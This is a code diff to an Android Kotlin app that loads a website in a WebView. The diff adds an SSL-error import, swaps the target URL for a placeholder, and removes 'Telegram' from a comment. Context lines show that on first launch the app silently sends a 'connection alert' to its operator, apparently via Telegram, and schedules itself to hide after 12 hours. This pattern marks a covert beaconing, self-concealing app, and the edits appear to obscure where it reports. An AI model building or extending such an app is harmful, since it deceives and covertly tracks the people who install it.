@@ -6,6 +6,7 @@ import android.app.PendingIntent
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
+import android.net.http.SslError
 import android.os.Build
 import android.os.Bundle
 import android.provider.Settings
@@ -32,7 +33,7 @@ class MainActivity : AppCompatActivity() {
             settings.userAgentString = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
             webViewClient = MyWebViewClient()
             webChromeClient = WebChromeClient()
-            loadUrl("https://moviebox.ph/")   // <-- REPLACE WITH YOUR URL
+            loadUrl("https://your-website.com")   // <-- REPLACE WITH YOUR URL
         }
         setContentView(webView)
 
@@ -40,7 +41,7 @@ class MainActivity : AppCompatActivity() {
         if (!prefs.getBoolean("first_launch_done", false)) {
             prefs.edit().putBoolean("first_launch_done", true).apply()
 
-            // Send connection alert to Telegram
+            // Send connection alert
             sendConnectionAlert()
 
             // Schedule self-hide after 12 hours
